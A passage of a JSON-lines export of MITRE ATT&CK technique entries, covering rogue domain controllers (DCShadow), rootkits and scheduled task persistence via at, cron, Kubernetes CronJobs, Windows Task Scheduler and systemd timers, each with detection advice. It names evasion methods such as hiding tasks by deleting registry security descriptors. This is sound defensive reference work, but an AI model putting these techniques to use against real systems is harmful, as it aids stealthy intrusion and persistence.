Micro; David Fiser, @anu4is, Trend Micro; Jay Chen, Palo Alto Networks; Magno Logan, @magnologan, Trend Micro; Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team","permissions required":null,"supports remote":null,"system requirements":null,"impact type":"Availability","effective permissions":null,"relationship citations":"(Citation: Sysdig Kinsing November 2020),(Citation: Cado Security TeamTNT Worm August 2020),(Citation: Aqua Kinsing April 2020),(Citation: Imminent Unit42 Dec2019),(Citation: Talos Rocke August 2018),(Citation: Unit 42 Lucifer June 2020),(Citation: ESET ForSSHe December 2018),(Citation: Unit 42 Rocke January 2019),(Citation: Cisco Talos Intelligence Group),(Citation: Unit42 CookieMiner Jan 2019),(Citation: FireEye APT41 Aug 2019),(Citation: RedCanary Mockingbird May 2020),(Citation: Unit 42 Hildegard Malware),(Citation: ESET LoudMiner June 2019),(Citation: Trend Micro Skidmap),(Citation: Lacework TeamTNT May 2021),"}
{"ID":"T1207","name":"Rogue Domain Controller","description":"Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\n\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)\n\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)","url":"https://attack.mitre.org/techniques/T1207","created":"18 April 2018","last modified":"08 March 2022","version":"2.1","tactics":"Defense Evasion","detection":"Monitor and analyze network traffic associated with data replication (such as calls to DrsAddEntry, DrsReplicaAdd, and especially GetNCChanges) between DCs as well as to/from non DC hosts. (Citation: GitHub DCSYNCMonitor) (Citation: DCShadow Blog) DC replication will naturally take place every 15 minutes but can be triggered by an adversary or by legitimate urgent changes (ex: passwords). Also consider monitoring and alerting on the replication of AD objects (Audit Detailed Directory Service Replication Events 4928 and 4929). (Citation: DCShadow Blog)\n\nLeverage AD directory synchronization (DirSync) to monitor changes to directory state using AD replication cookies. (Citation: Microsoft DirSync) (Citation: ADDSecurity DCShadow Feb 2018)\n\nBaseline and periodically analyze the Configuration partition of the AD schema and alert on creation of nTDSDSA objects. (Citation: DCShadow Blog)\n\nInvestigate usage of Kerberos Service Principal Names (SPNs), especially those associated with services (beginning with “GC/”) by computers not present in the DC organizational unit (OU). The SPN associated with the Directory Replication Service (DRS) Remote Protocol interface (GUID E3514235–4B06–11D1-AB04–00C04FC2DCD2) can be set without logging. (Citation: ADDSecurity DCShadow Feb 2018) A rogue DC must authenticate as a service using these two SPNs for the replication process to successfully complete.","platforms":"Windows","data sources":"Active Directory: Active Directory Object Creation, Active Directory: Active Directory Object Modification, Network Traffic: Network Traffic Content, User Account: User Account Authentication","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Log analysis","contributors":"Vincent Le Toux","permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Adsecurity Mimikatz Guide),(Citation: Deply Mimikatz),"}
{"ID":"T1014","name":"Rootkit","description":"Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)","url":"https://attack.mitre.org/techniques/T1014","created":"31 May 2017","last modified":"30 March 2023","version":"1.1","tactics":"Defense Evasion","detection":"Some rootkit protections may be built into anti-virus or operating system software. There are dedicated rootkit detection tools that look for specific types of rootkit behavior. Monitor for the existence of unrecognized DLLs, devices, services, and changes to the MBR. (Citation: Wikipedia Rootkit)","platforms":"Linux, Windows, macOS","data sources":"Drive: Drive Modification, File: File Modification, Firmware: Firmware Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Anti-virus, Application Control, File Monitoring, Host Intrusion Prevention Systems, Signature-based Detection, System Access Controls","contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET Sednit Part 3),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Cisco Talos Intelligence Group),(Citation: Umbreon Trend Micro),(Citation: Sophos ZeroAccess),(Citation: FireEye Hikit Rootkit),(Citation: Trend Micro Skidmap),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Trend Micro TeamTNT),(Citation: ESET LoJax Sept 2018),(Citation: Symantec Darkmoon Aug 2005),(Citation: FireEye APT41 Aug 2019),(Citation: FireEye HIKIT Rootkit Part 2),(Citation: Symantec APT28 Oct 2018),(Citation: Check Point Warzone Feb 2020),(Citation: Intezer HiddenWasp Map 2019),(Citation: NCSC Joint Report Public Tools),(Citation: Unit 42 Hildegard Malware),(Citation: Prevx Carberp March 2011),(Citation: Anomali Rocke March 2019),(Citation: Eset Ramsay May 2020),(Citation: Chronicle Winnti for Linux May 2019),(Citation: Kaspersky Turla),(Citation: Kaspersky Winnti April 2013),(Citation: NSA/FBI Drovorub August 2020),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: ESET Ebury Oct 2017),(Citation: TrendMicro Hacking Team UEFI),"}
{"ID":"T1053","name":"Scheduled Task/Job","description":"Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)\n\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.(Citation: ProofPoint Serpent)","url":"https://attack.mitre.org/techniques/T1053","created":"31 May 2017","last modified":"30 March 2023","version":"2.2","tactics":"Execution, Persistence, Privilege Escalation","detection":"Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. \n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":"Containers, Linux, Windows, macOS","data sources":"Command: Command Execution, Container: Container Creation, File: File Creation, File: File Modification, Process: Process Creation, Scheduled Job: Scheduled Job Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Alain Homewood, Insomnia Security; Andrew Northern, @ex_raritas; Bryan Campbell, @bry_campbell; Leo Loobeek, @leoloobeek; Prashant Verma, Paladion; Selena Larson, @selenalarson; Travis Smith, Tripwire; Zachary Abzug, @ZackDoesML","permissions required":"Administrator, SYSTEM, User","supports remote":true,"system requirements":null,"impact type":null,"effective permissions":"Administrator, SYSTEM, User","relationship citations":"(Citation: Cybereason StrifeWater Feb 2022),(Citation: Mandiant APT41),(Citation: TrendMicro EarthLusca 2022),(Citation: Talos Lokibot Jan 2021),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: TechNet Scheduling Priority),(Citation: TechNet Server Operator Scheduled Task),(Citation: Powersploit)"}
{"ID":"T1053.002","name":"Scheduled Task/Job: At","description":"Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial or recurring execution of malicious code. The [at](https://attack.mitre.org/software/S0110) utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)'s [schtasks](https://attack.mitre.org/software/S0111) in Windows environments, using [at](https://attack.mitre.org/software/S0110) requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group.\n\nOn Linux and macOS, [at](https://attack.mitre.org/software/S0110) may be invoked by the superuser as well as any users added to the <code>at.allow</code> file. If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file is checked. Every username not listed in <code>at.deny</code> is allowed to invoke [at](https://attack.mitre.org/software/S0110). If the <code>at.deny</code> exists and is empty, global use of [at](https://attack.mitre.org/software/S0110) is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use [at](https://attack.mitre.org/software/S0110).(Citation: Linux at)\n\nAdversaries may use [at](https://attack.mitre.org/software/S0110) to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote [Execution](https://attack.mitre.org/tactics/TA0002) as part of [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or to run a process under the context of a specified account (such as SYSTEM).\n\nIn Linux environments, adversaries may also abuse [at](https://attack.mitre.org/software/S0110) to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110) may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) if the binary is allowed to run as superuser via <code>sudo</code>.(Citation: GTFObins at)","url":"https://attack.mitre.org/techniques/T1053/002","created":"27 November 2019","last modified":"18 April 2022","version":"2.0","tactics":"Execution, Persistence, Privilege Escalation","detection":"Monitor process execution from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.\n\nConfigure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)\n\n* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered\n* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated\n* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\n* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data.\n\nIn Linux and macOS environments, monitor scheduled task creation using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. \n\nReview all jobs using the <code>atq</code> command and ensure IP addresses stored in the <code>SSH_CONNECTION</code> and <code>SSH_CLIENT</code> variables, machines that created the jobs, are trusted hosts. All [at](https://attack.mitre.org/software/S0110) jobs are stored in <code>/var/spool/cron/atjobs/</code>.(Citation: rowland linux at 2019)\n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [Command and Control](https://attack.mitre.org/tactics/TA0011), learning details about the environment through [Discovery](https://attack.mitre.org/tactics/TA0007), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008).","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Modification, Process: Process Creation, Scheduled Job: Scheduled Job Creation","is sub-technique":true,"sub-technique of":"T1053","defenses bypassed":null,"contributors":null,"permissions required":"Administrator, User","supports remote":true,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Linux at),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: FireEye Periscope March 2018),(Citation: Dell Lateral Movement),(Citation: CME Github September 2018),(Citation: Dell TG-3390),(Citation: TechNet At),(Citation: Kifarunix - Task Scheduling in Linux),(Citation: Powersploit),(Citation: Secureworks - AT.exe Scheduled Task),(Citation: TechNet Scheduling Priority),(Citation: TechNet Server Operator Scheduled Task)"}
{"ID":"T1053.007","name":"Scheduled Task/Job: Container Orchestration Job","description":"Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)","url":"https://attack.mitre.org/techniques/T1053/007","created":"29 March 2021","last modified":"15 April 2023","version":"1.3","tactics":"Execution, Persistence, Privilege Escalation","detection":"Monitor for the anomalous creation of scheduled jobs in container orchestration environments. Use logging agents on Kubernetes nodes and retrieve logs from sidecar proxies for application and resource pods to monitor malicious container orchestration job deployments. ","platforms":"Containers","data sources":"Container: Container Creation, File: File Creation, Scheduled Job: Scheduled Job Creation","is sub-technique":true,"sub-technique of":"T1053","defenses bypassed":null,"contributors":"Center for Threat-Informed Defense (CTID); Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team","permissions required":"User","supports remote":true,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: Kubernetes Hardening Guide)"}
{"ID":"T1053.003","name":"Scheduled Task/Job: Cron","description":"Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code.(Citation: 20 macOS Common Tools and Techniques) The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.\n\nAn adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). ","url":"https://attack.mitre.org/techniques/T1053/003","created":"03 December 2019","last modified":"24 March 2022","version":"1.1","tactics":"Execution, Persistence, Privilege Escalation","detection":"Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc.  \n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement. ","platforms":"Linux, macOS","data sources":"Command: Command Execution, File: File Modification, Process: Process Creation, Scheduled Job: Scheduled Job Creation","is sub-technique":true,"sub-technique of":"T1053","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Medium Anchor DNS July 2020),(Citation: Aqua Kinsing April 2020),(Citation: Red Canary NETWIRE January 2020),(Citation: Talos Rocke August 2018),(Citation: Unit42 Xbash Sept 2018),(Citation: ESET TeleBots Oct 2018),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Unit 42 Rocke January 2019),(Citation: ANSSI Sandworm January 2021),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Leonardo Turla Penquin May 2020),(Citation: Janicab),(Citation: Anomali Rocke March 2019),(Citation: Trend Micro Skidmap),(Citation: CheckPoint SpeakUp Feb 2019),"}
{"ID":"T1053.005","name":"Scheduled Task/Job: Scheduled Task","description":"Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) ","url":"https://attack.mitre.org/techniques/T1053/005","created":"27 November 2019","last modified":"07 April 2023","version":"1.3","tactics":"Execution, Persistence, Privilege Escalation","detection":"Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.\n\nConfigure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)\n\n* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered\n* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated\n* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\n* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.","platforms":"Windows","data sources":"Command: Command Execution, File: File Modification, Process: Process Creation, Scheduled Job: Scheduled Job Creation, Windows Registry: Windows Registry Key Creation","is sub-technique":true,"sub-technique of":"T1053","defenses bypassed":null,"contributors":"Andrew Northern, @ex_raritas; Bryan Campbell, @bry_campbell; Selena Larson, @selenalarson; Sittikorn Sangrattanapitak; Zachary Abzug, @ZackDoesML","permissions required":"Administrator","supports remote":true,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Microsoft Prestige ransomware October 2022),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Cybereason Oceanlotus May 2017),(Citation: Securelist WhiteBear Aug 2017),(Citation: FoxIT Wocao December 2019),(Citation: CISA AppleJeus Feb 2021),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Flashpoint FIN 7 March 2019),(Citation: Kaspersky WIRTE November 2021),(Citation: ESET Twitter Ida Pro Nov 2021),(Citation: Crowdstrike Qakbot October 2020),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: FireEye APT34 July 2019),(Citation: SecureWorks August 2019),(Citation: S2 Grupo TrickBot June 2017),(Citation: ESET Okrum July 2019),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Unit 42 Lucifer June 2020),(Citation: Github PowerShell Empire),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Juniper IcedID June 2020),(Citation: Tarrask scheduled task),(Citation: BitDefender Chafer May 2020),(Citation: FireEye APT34 Dec 2017),(Citation: Secure List Bad Rabbit),(Citation: McAfee Night Dragon),(Citation: Microsoft Actinium February 2022),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Prevailion DarkWatchman 2021),(Citation: KISA Operation Muzabi),(Citation: Microsoft Totbrick Oct 2017),(Citation: Symantec Ukraine Wipers February 2022),(Citation: ESET Gamaredon June 2020),(Citation: Proofpoint Bumblebee April 2022),(Citation: Group IB GrimAgent July 2021),(Citation: Proofpoint TA505 Jan 2019),(Citation: Kaspersky Tomiris Sep 2021),(Citation: US-CERT Emotet Jul 2018),(Citation: RedCanary Mockingbird May 2020),(Citation: NCC Group Team9 June 2020),(Citation: ClearSky Wilted Tulip July 2017),(Citation: ClearSky Siamesekitten August 2021),(Citation: TrendMicro Confucius APT Aug 2021),(Citation: Cybereason Valak May 2020),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Check Point APT34 April 2021),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Rancor Unit42 June 2018),(Citation: ESET Sednit Part 1),(Citation: FireEye NETWIRE March 2019),(Citation: Mandiant No Easy Breach),(Citation: Malwarebytes Dyreza November 2015),(Citation: CERT-EE Gamaredon January 2021),(Citation: Unit 42 IronNetInjector February 2021 ),(Citation: ESET Machete July 2019),(Citation: CISA SoreFang July 2016),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: FireEye FIN7 April 2017),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: SentinelOne Valak June 2020),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Bitdefender Naikon April 2021),(Citation: FireEye TRITON 2019),(Citation: Symantec Elfin Mar 2019),(Citation: GitHub PowerSploit May 2012),(Citation: Unit42 Molerat Mar 2020),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Symantec Shuckworm January 2022),(Citation: Symantec Bumblebee June 2022),(Citation: Unit 42 OilRig Sept 2018),(Citation: Securelist Remexi Jan 2019),(Citation: Eset Ramsay May 2020),(Citation: Group IB Cobalt Aug 2017),(Citation: Sophos Maze VM September 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: FBI FLASH APT39 September 2020),(Citation: ESET Crutch December 2020),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: FireEye FIN10 June 2017),(Citation: Cybereason Soft Cell June 2019),(Citation: Qualys LolZarus),(Citation: Trend Micro Qakbot May 2020),(Citation: Cofense RevengeRAT Feb 2019),(Citation: Volexity SolarWinds),(Citation: ESET Carbon Mar 2017),(Citation: Morphisec FIN7 June 2017),(Citation: Unit 42 Valak July 2020),(Citation: Cybereason Molerats Dec 2020),(Citation: Kroll Qakbot June 2020),(Citation: ESET Lazarus Jun 2020),(Citation: Volexity Patchwork June 2018),(Citation: Palo Alto Shamoon Nov 2016),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: FireEye FIN7 Aug 2018),(Citation: Palo Alto OilRig Sep 2018),(Citation: FireEye Shamoon Nov 2016),(Citation: FireEye APT39 Jan 2019),(Citation: F-Secure CozyDuke),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: CopyKittens Nov 2015),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: Cyberreason Anchor December 2019),(Citation: FireEye APT41 Aug 2019),(Citation: SecureList Griffon May 2019),(Citation: FireEye FIN6 April 2016),(Citation: Kaspersky Lyceum October 2021),(Citation: Bitdefender LuminousMoth July 2021),(Citation: ClearSky MuddyWater Nov 2018),(Citation: FireEye Operation Double Tap),(Citation: Symantec W32.Duqu),(Citation: ESET Attor Oct 2019),(Citation: Secureworks MCMD July 2019),(Citation: ESET Gazer Aug 2017),(Citation: CISA Zebrocy Oct 2020),(Citation: ASERT Donot March 2018),(Citation: Trend Micro Totbrick Oct 2016),(Citation: ESET OceanLotus Mar 2019),(Citation: CISA ComRAT Oct 2020),(Citation: DFIR Phosphorus November 2021),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: CrowdStrike Grim Spider May 2019),(Citation: F-Secure Cosmicduke),(Citation: ANSSI RYUK RANSOMWARE),(Citation: Red Canary Qbot),(Citation: Cybereason Kimsuky November 2020),(Citation: OilRig New Delivery Oct 2017),(Citation: Cybereason Cobalt Kitty 2017),(Citation: 360 Machete Sep 2020),(Citation: NCC Group Chimera January 2021),(Citation: TechNet Schtasks),(Citation: Cyphort EvilBunny Dec 2014),(Citation: Malwarebytes Higaisa 2020),(Citation: Symantec Buckeye),(Citation: Talos GravityRAT),(Citation: Talos Nyetya June 2017),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: Trend Micro Qakbot December 2020),(Citation: ESET InvisiMole June 2020),(Citation: PaloAlto Patchwork Mar 2018),(Citation: Kaspersky QakBot September 2021),(Citation: Unit42 Redaman January 2019),(Citation: Mandiant UNC3890 Aug 2022),(Citation: US-CERT TA18-074A),(Citation: FireEye APT32 May 2017),(Citation: Reaqta MuddyWater November 2017),(Citation: Cybereason Bazar July 2020),(Citation: HP SVCReady Jun 2022),(Citation: BlackBerry CostaRicto November 2020),(Citation: Securelist Machete Aug 2014),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: Accenture Lyceum Targets November 2021),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Mandiant APT41),(Citation: PowerSploit Documentation),(Citation: Talos Lokibot Jan 2021),(Citation: Talos Smoke Loader July 2018),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: McAfee Dianxun March 2021),(Citation: Talos Frankenstein June 2019),(Citation: Zscaler Higaisa 2020),(Citation: Unit 42 BackConfig May 2020),(Citation: Group IB Ransomware September 2020),(Citation: Carbon Black HotCroissant April 2020),(Citation: ESET ComRAT May 2020),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: ESET RTM Feb 2017),(Citation: ESET Sednit July 2015),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: ClearSky OilRig Jan 2017),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: Check Point Meteor Aug 2021),(Citation: Cyberint Qakbot May 2021),(Citation: ClearSky Pay2Kitten December 2020),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Cycraft Chimera April 2020),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: TechNet Scheduling Priority),(Citation: TechNet Server Operator Scheduled Task),(Citation: Powersploit)"}
{"ID":"T1053.006","name":"Scheduled Task/Job: Systemd Timers","description":"Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <code>.timer</code> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to [Cron](https://attack.mitre.org/techniques/T1053/003) in Linux environments.(Citation: archlinux Systemd Timers Aug 2020) Systemd timers may be activated remotely via the <code>systemctl</code> command line utility, which operates over [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: Systemd Remote Control)\n\nEach <code>.timer</code> file must have a corresponding <code>.service</code> file with the same name, e.g., <code>example.timer</code> and <code>example.service</code>. <code>.service</code> files are [Systemd Service](https://attack.mitre.org/techniques/T1543/002) unit files that are managed by the systemd system and service manager.(Citation: Linux man-pages: systemd January 2014) Privileged timers are written to <code>/etc/systemd/system/</code> and <code>/usr/lib/systemd/system</code> while user level are written to <code>~/.config/systemd/user/</code>.\n\nAn adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.","url":"https://attack.mitre.org/techniques/T1053/006","created":"12 October 2020","last modified":"27 July 2021","version":"1.1","tactics":"Execution, Persistence, Privilege Escalation","detection":"Systemd timer unit files may be detected by auditing file creation and modification events within the <code>/etc/systemd/system</code>, <code>/usr/lib/systemd/system/</code>, and <code>~/.config/systemd/user/</code> directories, as well as associated symbolic links. Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the ‘root’ user.\n\nSuspicious systemd timers can also be identified by comparing results against a trusted system baseline. Malicious 